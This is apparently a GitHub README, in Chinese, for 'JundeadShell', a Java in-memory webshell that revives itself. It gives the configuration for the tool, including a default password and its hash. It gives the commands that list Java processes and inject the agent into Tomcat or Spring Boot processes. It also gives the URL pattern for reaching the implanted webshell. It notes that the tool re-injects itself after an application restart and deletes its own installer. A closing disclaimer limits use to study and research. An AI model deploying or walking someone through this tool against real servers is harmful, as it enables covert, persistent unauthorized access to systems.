# JundeadShell
***
> 一个可以复活的Java内存马
***
### Usage
1.先根据环境修改配置文件
>配置文件位置在: agent_starter.jar内部config目录下
>```
># 目标url IP地址可以是127.0.0.1。在web应用关闭时，会挂起一个新进程用于监听。当web应用重新启动后，会自动重新注入。
>target_url=http://127.0.0.1:80/
># 连接密码的md5值 默认密码:Jundead
>password=AC9A489BB6873C5FB760370FD62A793E
># 调试模式 开启后会在当前目录创建日志文件，也会在目标web服务中打印少量日志信息。
>debug=false
>```

2.列出Java进程列表
>`java -jar agent_starter.jar list`

3.根据进程名注入
>`java -jar agent_starter.jar <displayName> <tomcat_version>`
>
>举例：`java -jar agent_starter.jar "SpringbootDemo.jar" 9`
>
>注入进程的displayName是SpringbootDemo.jar，使用的tomcat_version是9。
>
> PS: tomcat容器的进程名一般是："org.apache.catalina.startup.Bootstrap start"
>
> 注入成功后会自动删除自身。

4.连接webshell
>浏览器访问http://x.x.x.x/xxx?password=密码
***
### FAQ
- 注入成功了，但webshell不生效？
>如果注入目标是Tomcat容器的应用，连接webshell的url必须是能够正常访问的url。
>如果注入目标是springboot框架应用，连接webshell的url可以是任意url。
***
### Disclaimers
该项目仅供学习、研究之用，禁止用于非法用途。
